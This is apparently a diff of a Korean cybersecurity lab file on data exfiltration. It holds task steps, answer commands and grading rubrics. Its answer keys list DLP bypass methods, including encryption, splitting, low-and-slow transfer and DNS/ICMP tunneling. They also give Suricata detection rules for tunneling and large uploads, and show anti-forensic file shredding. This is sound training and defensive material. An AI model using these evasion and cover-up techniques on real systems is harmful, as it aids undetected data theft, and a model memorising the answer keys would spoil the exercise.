+      - 전략적 사용 맥락 없음
   target_vm: attacker
 - order: 12
   instruction: DLP(Data Loss Prevention) 우회 기법을 분석하라. 일반적인 DLP 시스템의 탐지 메커니즘과 우회 방법을 정리하라.
   hint: 내용 검사, 패턴 매칭, 행위 분석 등 DLP의 각 탐지 기법에 대한 우회를 설명한다
   category: exploit
   points: 10
-  answer: 'echo -e ''=== DLP Bypass Techniques ===\n\n[Content Inspection Bypass]\n1. Encryption: AES/XOR makes content unreadable\n2. Encoding: Base64, custom encoding schemes\n3. Splitting: Divide data
-    below inspection threshold\n\n[Pattern Matching Bypass]\n4. Obfuscation: Replace patterns (SSN: XXX-XX-XXXX -> encoded)\n5. File type masquerade: Rename .zip to .jpg\n6. Polyglot files: Valid as multiple
-    formats\n\n[Behavioral Analysis Bypass]\n7. Low-and-slow: Small amounts over long time\n8. Business hours only: Blend with normal activity\n9. Legitimate channels: Use approved cloud services\n\n[Network
-    Bypass]\n10. Encrypted tunnels: VPN, SSH tunnels\n11. Protocol abuse: DNS, ICMP tunneling\n12. Alternate routes: Mobile hotspot, Bluetooth\n\n[Defense Enhancement]\n- Multi-layer DLP (network + endpoint
-    + cloud)\n- Behavioral analytics (UEBA)\n- Encrypted traffic inspection (SSL/TLS break)'''
-  answer_detail: DLP 우회는 탐지 메커니즘의 한계를 악용한다. 내용 검사는 암호화로, 패턴 매칭은 난독화로, 행위 분석은 저속 유출로 우회한다. 효과적인 DLP는 네트워크, 엔드포인트, 클라우드의 3계층에서 동시에 동작하고, UEBA로 비정상 행위를 탐지해야 한다.
+  answer: 'echo -e ''=== DLP Bypass Techniques ===\n\n[Content Inspection Bypass]\n1. Encryption: AES/XOR
+    makes content unreadable\n2. Encoding: Base64, custom encoding schemes\n3. Splitting: Divide data
+    below inspection threshold\n\n[Pattern Matching Bypass]\n4. Obfuscation: Replace patterns (SSN: XXX-XX-XXXX
+    -> encoded)\n5. File type masquerade: Rename .zip to .jpg\n6. Polyglot files: Valid as multiple formats\n\n[Behavioral
+    Analysis Bypass]\n7. Low-and-slow: Small amounts over long time\n8. Business hours only: Blend with
+    normal activity\n9. Legitimate channels: Use approved cloud services\n\n[Network Bypass]\n10. Encrypted
+    tunnels: VPN, SSH tunnels\n11. Protocol abuse: DNS, ICMP tunneling\n12. Alternate routes: Mobile hotspot,
+    Bluetooth\n\n[Defense Enhancement]\n- Multi-layer DLP (network + endpoint + cloud)\n- Behavioral analytics
+    (UEBA)\n- Encrypted traffic inspection (SSL/TLS break)'''
+  answer_detail: DLP 우회는 탐지 메커니즘의 한계를 악용한다. 내용 검사는 암호화로, 패턴 매칭은 난독화로, 행위 분석은 저속 유출로 우회한다. 효과적인 DLP는 네트워크,
+    엔드포인트, 클라우드의 3계층에서 동시에 동작하고, UEBA로 비정상 행위를 탐지해야 한다.
   verify:
     type: output_contains
     expect: DLP Bypass
     field: stdout
+    semantic:
+      intent: 'DLP 우회 — [Content] 암호화/인코딩/분할 / [Pattern] 난독화/파일 위장/Polyglot / [Behavioral] Low-and-slow/업무
+        시간/합법 채널 / [Network] VPN/SSH 터널/DNS-ICMP 터널/모바일 핫스팟. 방어 강화: 다층 DLP(network+endpoint+cloud) + UEBA
+        + SSL break.'
+      success_criteria:
+      - DLP Bypass 키워드
+      - 4개 카테고리 (Content/Pattern/Behavioral/Network)
+      - 방어 강화 (다층 + UEBA)
+      acceptable_methods:
+      - 우회 매트릭스
+      - MITRE ATT&CK Defense Evasion
+      - Atomic Red Team 우회 테스트
+      negative_signs:
+      - 카테고리 2개 이하
+      - 기법 5개 이하
+      - 방어 강화 없음
   target_vm: attacker
 - order: 13
   instruction: 유출 탐지를 위한 Suricata 규칙을 작성하라. DNS 터널링과 대용량 HTTP 업로드를 탐지하는 규칙을 만들라.
   hint: alert dns/http 규칙에서 content, dsize, threshold 옵션을 사용한다
   category: defense
   points: 10
-  answer: 'echo -e ''=== Suricata Exfiltration Detection Rules ===\n\n# DNS Tunneling: Long subdomain queries\nalert dns any any -> any 53 (msg:"Possible DNS tunneling - long query"; dns.query; content:"."  ;
-    pcre:"/^[a-zA-Z0-9]{30,}\\./"; threshold:type threshold, track by_src, count 10, seconds 60; sid:1000001; rev:1;)\n\n# HTTP Large Upload\nalert http any any -> any any (msg:"Large HTTP POST upload";
-    flow:to_server,established; http.method; content:"POST"; http.content_len; content:!"|30|"; byte_test:0,>,1000000,0,string; sid:1000002; rev:1;)\n\n# Base64 in HTTP Body\nalert http any any -> any any
-    (msg:"Base64 encoded data in HTTP POST"; flow:to_server,established; http.method; content:"POST"; http.request_body; pcre:"/^[A-Za-z0-9+\\/]{500,}={0,2}$/"; sid:1000003; rev:1;)\n\n# ICMP Data Exfil\nalert
-    icmp any any -> any any (msg:"ICMP payload size anomaly"; dsize:>100; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000004; rev:1;)'''
-  answer_detail: Suricata IDS/IPS 규칙은 데이터 유출의 네트워크 시그니처를 탐지한다. DNS 터널링은 긴 서브도메인 라벨과 높은 쿼리 빈도로, HTTP 유출은 대용량 POST와 Base64 패턴으로, ICMP 유출은 비정상 페이로드 크기로 탐지한다. threshold 옵션으로 오탐을 줄인다.
+  answer: 'echo -e ''=== Suricata Exfiltration Detection Rules ===\n\n# DNS Tunneling: Long subdomain
+    queries\nalert dns any any -> any 53 (msg:"Possible DNS tunneling - long query"; dns.query; content:"."  ;
+    pcre:"/^[a-zA-Z0-9]{30,}\\./"; threshold:type threshold, track by_src, count 10, seconds 60; sid:1000001;
+    rev:1;)\n\n# HTTP Large Upload\nalert http any any -> any any (msg:"Large HTTP POST upload"; flow:to_server,established;
+    http.method; content:"POST"; http.content_len; content:!"|30|"; byte_test:0,>,1000000,0,string; sid:1000002;
+    rev:1;)\n\n# Base64 in HTTP Body\nalert http any any -> any any (msg:"Base64 encoded data in HTTP
+    POST"; flow:to_server,established; http.method; content:"POST"; http.request_body; pcre:"/^[A-Za-z0-9+\\/]{500,}={0,2}$/";
+    sid:1000003; rev:1;)\n\n# ICMP Data Exfil\nalert icmp any any -> any any (msg:"ICMP payload size anomaly";
+    dsize:>100; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000004; rev:1;)'''
+  answer_detail: Suricata IDS/IPS 규칙은 데이터 유출의 네트워크 시그니처를 탐지한다. DNS 터널링은 긴 서브도메인 라벨과 높은 쿼리 빈도로, HTTP 유출은
+    대용량 POST와 Base64 패턴으로, ICMP 유출은 비정상 페이로드 크기로 탐지한다. threshold 옵션으로 오탐을 줄인다.
   verify:
     type: output_contains
     expect: Suricata
     field: stdout
+    semantic:
+      intent: Suricata 유출 탐지 룰 — [DNS] dns.query + pcre [a-zA-Z0-9]{30,} + threshold count 10 60s / [HTTP
+        Large POST] http.method POST + content_len > 1000000 / [Base64 Body] http.request_body + pcre
+        [A-Za-z0-9+/]{500,} / [ICMP] dsize:>100 + threshold count 5 60s. NIST SP 800-94 IDS.
+      success_criteria:
+      - Suricata 키워드
+      - alert dns/http/icmp 룰 3개 이상
+      - threshold + pcre 정밀도
+      acceptable_methods:
+      - Suricata content/pcre
+      - Snort 변형
+      - Zeek scripts
+      negative_signs:
+      - 룰 1개 이하
+      - threshold 없음
+      - 탐지 조건 부족
   target_vm: attacker
 - order: 14
   instruction: 실습 환경을 정리하라. 스테이징 디렉토리와 암호화된 파일을 안전하게 삭제하라.
   hint: shred 또는 rm으로 파일을 삭제하고, 삭제를 확인한다
   category: analysis
   points: 5
-  answer: shred -u /tmp/exfil_data.enc /tmp/exfil_data.tar.gz 2>/dev/null; rm -rf /tmp/exfil_staging /tmp/cover.gif && echo 'Staging area cleaned' && ls /tmp/exfil_* 2>/dev/null || echo 'All exfil files
-    removed'
-  answer_detail: 데이터 유출 실습 후 모든 민감 파일을 안전하게 삭제해야 한다. shred는 파일을 무작위 데이터로 덮어쓴 후 삭제하여 복구를 방지한다. 실제 공격에서 APT 그룹도 안티포렌식 기법으로 흔적을 제거한다.
+  answer: shred -u /tmp/exfil_data.enc /tmp/exfil_data.tar.gz 2>/dev/null; rm -rf /tmp/exfil_staging /tmp/cover.gif
+    && echo 'Staging area cleaned' && ls /tmp/exfil_* 2>/dev/null || echo 'All exfil files removed'
+  answer_detail: 데이터 유출 실습 후 모든 민감 파일을 안전하게 삭제해야 한다. shred는 파일을 무작위 데이터로 덮어쓴 후 삭제하여 복구를 방지한다. 실제 공격에서
+    APT 그룹도 안티포렌식 기법으로 흔적을 제거한다.
   verify:
     type: output_contains
     expect: removed
     field: stdout
+    semantic:
+      intent: 안전 삭제 — shred -u /tmp/exfil_data.enc + rm -rf staging. shred = 무작위 데이터로 덮어쓴 후 삭제 → 복구 방지.
+        APT 안티포렌식. MITRE T1070.004 File Deletion.
+      success_criteria:
+      - shred + rm 안전 삭제
+      - removed 키워드
+      - 검증 (ls)
+      acceptable_methods:
+      - shred -u
+      - wipe / srm
+      - dd if=/dev/urandom 후 rm
+      negative_signs:
+      - 단순 rm만
+      - 검증 없음
+      - 안티포렌식 맥락 없음
   target_vm: attacker
 - order: 15
   instruction: 데이터 유출 방어 전략을 종합하여 /tmp/exfil_defense.txt에 작성하라.
@@ -266,9 +534,26 @@ steps:
     EOF
 
     cat /tmp/exfil_defense.txt'
-  answer_detail: 데이터 유출 방어는 예방(Prevention), 탐지(Detection), 대응(Response)의 3단계로 구성된다. 데이터 분류와 접근 통제가 예방의 기본이고, 다계층 DLP와 행위 분석이 탐지의 핵심이다. 완벽한 차단은 불가능하므로 탐지 시간(MTTD)을 최소화하는 것이 현실적인 목표이다.
+  answer_detail: 데이터 유출 방어는 예방(Prevention), 탐지(Detection), 대응(Response)의 3단계로 구성된다. 데이터 분류와 접근 통제가 예방의
+    기본이고, 다계층 DLP와 행위 분석이 탐지의 핵심이다. 완벽한 차단은 불가능하므로 탐지 시간(MTTD)을 최소화하는 것이 현실적인 목표이다.
   verify:
     type: output_contains
     expect: Exfiltration Defense Strategy
     field: stdout
+    semantic:
+      intent: '유출 방어 전략 — echo > /tmp/exfil_defense.txt: [Prevention] 데이터 분류 + 접근 통제 + 암호화 at rest + 세그먼테이션
+        / [Detection] Network DLP + DNS + CASB + Endpoint DLP + UEBA + NetFlow / [Response] 자동 차단 + 포렌식
+        + 격리 / [Metrics] MTTD + 오탐률 + 일일 외부 데이터 볼륨.'
+      success_criteria:
+      - Exfiltration Defense Strategy 키워드
+      - Prevention + Detection + Response + Metrics 4섹션
+      - MTTD 지표 명시
+      acceptable_methods:
+      - 3단계 방어 + 지표
+      - NIST CSF 5 함수
+      - MITRE D3FEND Exfiltration
+      negative_signs:
+      - 섹션 2개 이하
+      - 지표 없음
+      - 탐지 도구 부족
   target_vm: attacker
